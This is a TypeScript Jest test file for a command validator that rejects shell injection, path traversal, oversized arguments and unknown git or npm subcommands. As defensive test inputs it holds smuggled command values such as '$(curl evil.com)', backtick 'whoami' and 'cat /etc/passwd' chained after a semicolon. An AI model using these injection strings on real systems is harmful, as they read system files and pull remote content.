import { CommandValidator } from '../command-validator';

describe('CommandValidator', () => {
  describe('validateArguments', () => {
    it('should allow safe arguments', () => {
      const result = CommandValidator.validateArguments('git', ['status']);
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should block command injection with semicolon', () => {
      const result = CommandValidator.validateArguments('git', ['status;', 'cat', '/etc/passwd']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('dangerous characters');
    });

    it('should block command injection with pipe', () => {
      const result = CommandValidator.validateArguments('ls', ['-la', '|', 'grep', 'secret']);
      expect(result.valid).toBe(false);
    });

    it('should block command injection with backticks', () => {
      const result = CommandValidator.validateArguments('echo', ['`whoami`']);
      expect(result.valid).toBe(false);
    });

    it('should block command injection with $() substitution', () => {
      const result = CommandValidator.validateArguments('npm', ['install', '$(curl evil.com)']);
      expect(result.valid).toBe(false);
    });

    it('should block path traversal', () => {
      const result = CommandValidator.validateArguments('cat', ['../../etc/passwd']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('Path traversal');
    });

    it('should allow quoted strings with special chars', () => {
      const result = CommandValidator.validateArguments('git', ['commit', '-m', '"Fix: issue #123"']);
      expect(result.valid).toBe(true);
    });

    it('should reject oversized arguments', () => {
      const longArg = 'a'.repeat(3000);
      const result = CommandValidator.validateArguments('ls', [longArg]);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('exceeds maximum length');
    });

    it('should validate git subcommands', () => {
      const result = CommandValidator.validateArguments('git', ['hack']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('Invalid subcommand');
    });

    it('should validate npm subcommands', () => {
      const result = CommandValidator.validateArguments('npm', ['malicious']);
      expect(result.valid).toBe(false);
    });
  });

  describe('validateRawCommand', () => {
    it('should reject multi-line commands', () => {
      const result = CommandValidator.validateRawCommand('ls\ncat /etc/passwd');
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('Multi-line');
    });

    it('should reject subshell syntax', () => {
      const result = CommandValidator.validateRawCommand("/exec echo $(whoami)");
      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Subshell syntax $(...) detected');
    });

    it('should reject bash $\' quoting', () => {
      const result = CommandValidator.validateRawCommand("echo $'hello;cat /etc/passwd'");
      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Bash $\'...\' syntax is not allowed');
    });

    it('should accept simple commands', () => {
      const result = CommandValidator.validateRawCommand('ls -la');
      expect(result.valid).toBe(true);
    });
  });
});